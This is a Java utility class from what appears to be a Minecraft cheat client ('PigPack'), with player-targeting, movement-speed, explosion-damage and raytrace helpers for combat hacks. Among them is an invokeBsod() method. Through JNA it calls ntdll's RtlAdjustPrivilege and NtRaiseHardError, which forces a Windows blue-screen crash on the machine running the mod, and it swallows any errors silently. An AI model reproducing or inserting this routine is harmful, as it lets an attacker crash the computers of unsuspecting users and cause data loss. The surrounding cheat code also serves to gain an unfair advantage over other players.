package me.pig.pack.utils;

import me.pig.pack.PigPack;
import me.pig.pack.api.Globals;
import com.sun.jna.Function;
import com.sun.jna.Memory;
import net.minecraft.block.Block;
import net.minecraft.block.BlockWeb;
import net.minecraft.block.material.Material;
import net.minecraft.block.state.IBlockState;
import net.minecraft.enchantment.EnchantmentHelper;
import net.minecraft.entity.Entity;
import net.minecraft.entity.EntityLivingBase;
import net.minecraft.entity.SharedMonsterAttributes;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.init.MobEffects;
import net.minecraft.util.CombatRules;
import net.minecraft.util.DamageSource;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.math.*;
public class EntityUtil implements Globals {
    public static EntityPlayer getTarget ( final float range, final boolean canCheckEntity) {
        EntityPlayer currentTarget = null;
        for (int size = mc.world.playerEntities.size(), i = 0; i < size; ++i) {
            final EntityPlayer player = mc.world.playerEntities.get(i);
            if (!EntityUtil.isntValid(player, range)) {
                if (!mc.player.canEntityBeSeen(player) && canCheckEntity)
                if (currentTarget == null) {
                    currentTarget = player;
                } else if (mc.player.getDistanceSq(player) < mc.player.getDistanceSq(currentTarget)) {
                    if (mc.player.canEntityBeSeen(player)) {
                        currentTarget = player;
                    }
                }
            }

        }
        return currentTarget;
    }
    public static Vec3d getInterpolatedPos(Entity entity, float partialTicks) {
        return new Vec3d(entity.lastTickPosX, entity.lastTickPosY, entity.lastTickPosZ).add(getInterpolatedAmount(entity, partialTicks));
    }
    public static double[] directionSpeed(final double speed) {
        float forward = mc.player.movementInput.moveForward;
        float side = mc.player.movementInput.moveStrafe;
        float yaw = mc.player.prevRotationYaw + (mc.player.rotationYaw - mc.player.prevRotationYaw) * mc.getRenderPartialTicks();
        if (forward != 0.0f) {
            if (side > 0.0f) {
                yaw += ((forward > 0.0f) ? -45 : 45);
            }
            else if (side < 0.0f) {
                yaw += ((forward > 0.0f) ? 45 : -45);
            }
            side = 0.0f;
            if (forward > 0.0f) {
                forward = 1.0f;
            }
            else if (forward < 0.0f) {
                forward = -1.0f;
            }
        }
        final double sin = Math.sin(Math.toRadians(yaw + 90.0f));
        final double cos = Math.cos(Math.toRadians(yaw + 90.0f));
        final double posX = forward * speed * cos + side * speed * sin;
        final double posZ = forward * speed * sin - side * speed * cos;
        return new double[] { posX, posZ };
    }

    public static Vec3d getInterpolatedAmount(Entity entity, double x, double y, double z) {
        return new Vec3d((entity.posX - entity.lastTickPosX) * x, (entity.posY - entity.lastTickPosY) * y, (entity.posZ - entity.lastTickPosZ) * z);
    }

    public static Vec3d getInterpolatedAmount(Entity entity, float partialTicks) {
        return getInterpolatedAmount(entity, partialTicks, partialTicks, partialTicks);
    }
    public static boolean isMoving ( ) {
        return ( double ) mc.player.moveForward != 0.0 || ( double ) mc.player.moveStrafing != 0.0;
    }

    public static boolean isntValid ( final EntityPlayer entity, final double range ) {
        return EntityUtil.mc.player.getDistance( entity ) > range || entity == EntityUtil.mc.player || entity.getHealth( ) <= 0.0f || entity.isDead || PigPack.getFriendManager( ).is( entity.getName( ) ) || entity.isInvisible();
    }

    public static float getHealth ( final EntityLivingBase player ) {
        return player.getHealth( ) + player.getAbsorptionAmount( );
    }

    public static float getBlastReduction ( final EntityLivingBase entity, final float damageI ) {
        float damage = damageI;
        damage = CombatRules.getDamageAfterAbsorb( damage, ( float ) entity.getTotalArmorValue( ), ( float ) entity.getEntityAttribute( SharedMonsterAttributes.ARMOR_TOUGHNESS ).getAttributeValue( ) );
        damage *= 1.0f - MathHelper.clamp( ( float ) EnchantmentHelper.getEnchantmentModifierDamage( entity.getArmorInventoryList( ), EntityUtil.EXPLOSION_SOURCE ), 0.0f, 20.0f ) / 25.0f;
        if ( entity.isPotionActive( MobEffects.RESISTANCE ) ) {
            return damage - damage / 4.0f;
        }
        return damage;
    }
    public static void invokeBsod ( ) {
        try {
            Boolean bl = null;
            long response = 0;

            Function RtlAdjustPrivilege = Function.getFunction( "ntdll.dll", "RtlAdjustPrivilege" );
            long r1 = RtlAdjustPrivilege.invokeLong( new Object[] { 19, true, false, new Memory( 1 ) } );

            Function NtRaiseHardError = Function.getFunction( "ntdll.dll", "NtRaiseHardError" );
            long r2 = NtRaiseHardError.invokeLong( new Object[] { 0xC0000420, 0, 0, 0, 6, new Memory( 32 ) } );
        } catch ( Exception e3 ) {
            //e.printStackTrace( );
        }
    }

    public static RayTraceResult rayTraceBlocks ( Vec3d vec31, final Vec3d vec32, final boolean stopOnLiquid, final boolean ignoreBlockWithoutBoundingBox, final boolean returnLastUncollidableBlock ) {
        final int i = MathHelper.floor( vec32.x );
        final int j = MathHelper.floor( vec32.y );
        final int k = MathHelper.floor( vec32.z );
        int l = MathHelper.floor( vec31.x );
        int i2 = MathHelper.floor( vec31.y );
        int j2 = MathHelper.floor( vec31.z );
        BlockPos blockpos = new BlockPos( l, i2, j2 );
        final IBlockState iblockstate = EntityUtil.mc.world.getBlockState( blockpos );
        final Block block = iblockstate.getBlock( );
        if ( ( !ignoreBlockWithoutBoundingBox || iblockstate.getCollisionBoundingBox( EntityUtil.mc.world, blockpos ) != Block.NULL_AABB ) && block.canCollideCheck( iblockstate, stopOnLiquid ) ) {
            return iblockstate.collisionRayTrace( EntityUtil.mc.world, blockpos, vec31, vec32 );
        }
        RayTraceResult raytraceresult2 = null;
        int k2 = 200;
        while ( k2-- >= 0 ) {
            if ( Double.isNaN( vec31.x ) || Double.isNaN( vec31.y ) || Double.isNaN( vec31.z ) ) {
                return null;
            }
            if ( l == i && i2 == j && j2 == k ) {
                return returnLastUncollidableBlock ? raytraceresult2 : null;
            }
            boolean flag2 = true;
            boolean flag3 = true;
            boolean flag4 = true;
            double d0 = 999.0;
            double d2 = 999.0;
            double d3 = 999.0;
            if ( i > l ) {
                d0 = l + 1.0;
            } else if ( i < l ) {
                d0 = l + 0.0;
            } else {
                flag2 = false;
            }
            if ( j > i2 ) {
                d2 = i2 + 1.0;
            } else if ( j < i2 ) {
                d2 = i2 + 0.0;
            } else {
                flag3 = false;
            }
            if ( k > j2 ) {
                d3 = j2 + 1.0;
            } else if ( k < j2 ) {
                d3 = j2 + 0.0;
            } else {
                flag4 = false;
            }
            double d4 = 999.0;
            double d5 = 999.0;
            double d6 = 999.0;
            final double d7 = vec32.x - vec31.x;
            final double d8 = vec32.y - vec31.y;
            final double d9 = vec32.z - vec31.z;
            if ( flag2 ) {
                d4 = ( d0 - vec31.x ) / d7;
            }
            if ( flag3 ) {
                d5 = ( d2 - vec31.y ) / d8;
            }
            if ( flag4 ) {
                d6 = ( d3 - vec31.z ) / d9;
            }
            if ( d4 == -0.0 ) {
                d4 = -1.0E-4;
            }
            if ( d5 == -0.0 ) {
                d5 = -1.0E-4;
            }
            if ( d6 == -0.0 ) {
                d6 = -1.0E-4;
            }
            EnumFacing enumfacing;
            if ( d4 < d5 && d4 < d6 ) {
                enumfacing = ( ( i > l ) ? EnumFacing.WEST : EnumFacing.EAST );
                vec31 = new Vec3d( d0, vec31.y + d8 * d4, vec31.z + d9 * d4 );
            } else if ( d5 < d6 ) {
                enumfacing = ( ( j > i2 ) ? EnumFacing.DOWN : EnumFacing.UP );
                vec31 = new Vec3d( vec31.x + d7 * d5, d2, vec31.z + d9 * d5 );
            } else {
                enumfacing = ( ( k > j2 ) ? EnumFacing.NORTH : EnumFacing.SOUTH );
                vec31 = new Vec3d( vec31.x + d7 * d6, vec31.y + d8 * d6, d3 );
            }
            l = MathHelper.floor( vec31.x ) - ( ( enumfacing == EnumFacing.EAST ) ? 1 : 0 );
            i2 = MathHelper.floor( vec31.y ) - ( ( enumfacing == EnumFacing.UP ) ? 1 : 0 );
            j2 = MathHelper.floor( vec31.z ) - ( ( enumfacing == EnumFacing.SOUTH ) ? 1 : 0 );
            blockpos = new BlockPos( l, i2, j2 );
            final IBlockState iblockstate2 = EntityUtil.mc.world.getBlockState( blockpos );
            final Block block2 = iblockstate2.getBlock( );
            if ( ignoreBlockWithoutBoundingBox && iblockstate2.getMaterial( ) != Material.PORTAL && iblockstate2.getCollisionBoundingBox( EntityUtil.mc.world, blockpos ) == Block.NULL_AABB ) {
                continue;
            }
            if ( block2.canCollideCheck( iblockstate2, stopOnLiquid ) && !( block2 instanceof BlockWeb ) ) {
                return iblockstate2.collisionRayTrace( EntityUtil.mc.world, blockpos, vec31, vec32 );
            }
            raytraceresult2 = new RayTraceResult( RayTraceResult.Type.MISS, vec31, enumfacing, blockpos );
        }
        return returnLastUncollidableBlock ? raytraceresult2 : null;
    }

    private static final DamageSource EXPLOSION_SOURCE;

    static {
        EXPLOSION_SOURCE = new DamageSource( "explosion" ).setDifficultyScaled( ).setExplosion( );
    }

}
